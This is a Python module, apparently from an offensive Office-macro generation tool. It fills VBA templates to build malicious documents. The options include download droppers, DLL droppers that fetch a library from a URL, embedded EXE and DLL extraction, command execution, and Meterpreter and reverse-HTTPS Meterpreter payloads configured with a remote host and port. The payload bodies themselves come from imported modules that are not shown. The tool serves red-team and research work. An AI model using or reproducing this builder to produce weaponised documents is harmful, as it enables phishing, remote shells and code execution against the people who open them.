#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import shlex
import os
import logging
from modules.mp_module import MpModule
import vbLib.Meterpreter
import vbLib.WebMeter
import vbLib.templates
from common import  utils
from common.utils import MSTypes



class TemplateToVba(MpModule):
    """ Generate a VBA document from a given template """
        
    def _fillGenericTemplate(self, content):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if os.path.isfile(cmdFile):
            f = open(cmdFile, 'r')
            valuesFileContent = f.read()
            f.close()
            values = shlex.split(valuesFileContent) # split on space but preserve what is between quotes
            for value in values:
                content = content.replace("<<<TEMPLATE>>>", value, 1)
            # remove file containing template values
            os.remove(cmdFile)
            logging.info("   [-] OK!") 
        else:
            logging.warn("   [!] No input value was provided for this template.\n       Use \"-t help\" option for help on templates.")
        
        # Create module
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 


    
    def _processEmbedExeTemplate(self):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":         
            extractedFilePath = utils.randomAlpha(5)+os.path.splitext(self.mpSession.embeddedFilePath)[1]
        else:
            f = open(cmdFile, 'r')
            params = shlex.split(f.read())
            extractedFilePath = params[0]
            f.close()
            
        logging.info("   [-] Output path when file is extracted: %s" % extractedFilePath)

        content = vbLib.templates.EMBED_EXE
        content = content.replace("<<<OUT_FILE>>>", extractedFilePath)
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        if os.path.isfile(cmdFile):
            os.remove(cmdFile)
        logging.info("   [-] OK!")
    
    
    def _processDropperDllTemplate(self):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":
            logging.error("   [!] Could not find template parameters!")
            return
        f = open(cmdFile, 'r')
        valuesFileContent = f.read()
        f.close()
        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
        dllUrl = params[0]
        dllFct = params[1]        

        # generate main module 
        content = vbLib.templates.DROPPER_DLL2
        content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
        invokerModule = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
        
        # second module
        content = vbLib.templates.DROPPER_DLL1
        content = content.replace("<<<DLL_URL>>>", dllUrl)
        if MSTypes.XL in self.outputFileType:
            msApp = MSTypes.XL
        elif MSTypes.WD in self.outputFileType:
            msApp = MSTypes.WD
        elif MSTypes.PPT in self.outputFileType:
            msApp = "PowerPoint"
        elif MSTypes.VSD in self.outputFileType:
            msApp = "Visio"
        elif MSTypes.MPP in self.outputFileType:
            msApp = "Project"
        else:
            msApp = MSTypes.UNKNOWN
        content = content.replace("<<<APPLICATION>>>", msApp)
        content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))

        os.remove(cmdFile)
        logging.info("   [-] OK!")
    
    
    def _processEmbedDllTemplate(self):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":
            logging.error("   [!] Could not find template parameters!")
            return
        f = open(cmdFile, 'r')
        valuesFileContent = f.read()
        f.close()
        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
        dllFct = params[0]
            
        #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT]:
            # for VBS based file
            content = vbLib.templates.EMBED_DLL_VBS
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            vbaFile = self.addVBAModule(content)
            logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile))
        else:
            # for VBA based files
            # generate main module 
            content = vbLib.templates.DROPPER_DLL2
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            invokerModule = self.addVBAModule(content)
            logging.info("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
            
            # second module
            content = vbLib.templates.EMBED_DLL_VBA
            if MSTypes.XL in self.outputFileType:
                msApp = MSTypes.XL
            elif MSTypes.WD in self.outputFileType:
                msApp = MSTypes.WD
            elif MSTypes.PPT in self.outputFileType:
                msApp = "PowerPoint"
            elif MSTypes.VSD in self.outputFileType:
                msApp = "Visio"
            elif MSTypes.MPP in self.outputFileType:
                msApp = "Project"
            else:
                msApp = MSTypes.UNKNOWN
            content = content.replace("<<<APPLICATION>>>", msApp)
            content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
            vbaFile = self.addVBAModule(content)
            logging.info("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
            
        if os.path.isfile(cmdFile):
            os.remove(cmdFile)
        logging.info("   [-] OK!")
    
    
    def _processMeterpreterTemplate(self):
        """ Generate meterpreter template for VBA and VBS based """
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":
            logging.error("   [!] Could not find template parameters!")
            return
        f = open(cmdFile, 'r')
        valuesFileContent = f.read()
        f.close()
        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
        rhost = params[0]
        rport = params[1] 
        content = vbLib.templates.METERPRETER
        content = content.replace("<<<RHOST>>>", rhost)
        content = content.replace("<<<RPORT>>>", rport)
        if self.outputFileType in [MSTypes.HTA, MSTypes.VBS, MSTypes.SCT]:
            content = content + vbLib.Meterpreter.VBS
        else:
            content = content + vbLib.Meterpreter.VBA
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        
 
    def _processWebMeterTemplate(self):
        """ Generate reverse https meterpreter template for VBA and VBS based  
        
        """
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if cmdFile is None or cmdFile == "":
            logging.error("   [!] Could not find template parameters!")
            return
        f = open(cmdFile, 'r')
        valuesFileContent = f.read()
        f.close()
        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
        rhost = params[0]
        rport = params[1] 
        content = vbLib.templates.WEBMETER
        content = content.replace("<<<RHOST>>>", rhost)
        content = content.replace("<<<RPORT>>>", rport)
        content = content + vbLib.WebMeter.VBA

        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        
 
    def _generation(self):
        if self.template is None:
            logging.info("   [!] No template defined")
            return
        if self.template == "HELLO":
            content = vbLib.templates.HELLO
        elif self.template == "DROPPER":
            content = vbLib.templates.DROPPER
        elif self.template == "DROPPER2":
            content = vbLib.templates.DROPPER2
        elif self.template == "DROPPER_PS":
            content = vbLib.templates.DROPPER_PS
        elif self.template == "METERPRETER":
            self._processMeterpreterTemplate()
            return
        elif self.template == "WEBMETER":
            self._processWebMeterTemplate()
            return
        elif self.template == "CMD":
            content = vbLib.templates.CMD
        elif self.template == "EMBED_EXE":
            self._processEmbedExeTemplate()
            return
        elif self.template == "EMBED_DLL":
            self._processEmbedDllTemplate()
            return
        elif self.template == "DROPPER_DLL":
            self._processDropperDllTemplate()
            return
        else: # if not one of default template suppose its a custom template
            if os.path.isfile(self.template):
                f = open(self.template, 'r')
                content = f.read()
                f.close()
            else:
                logging.info("   [!] Template %s is not recognized as file or default template." % self.template)
                return
         

        self._fillGenericTemplate(content) 
   
    
    def run(self):
        logging.info(" [+] Generating VBA document from template...")
        self._generation()
        

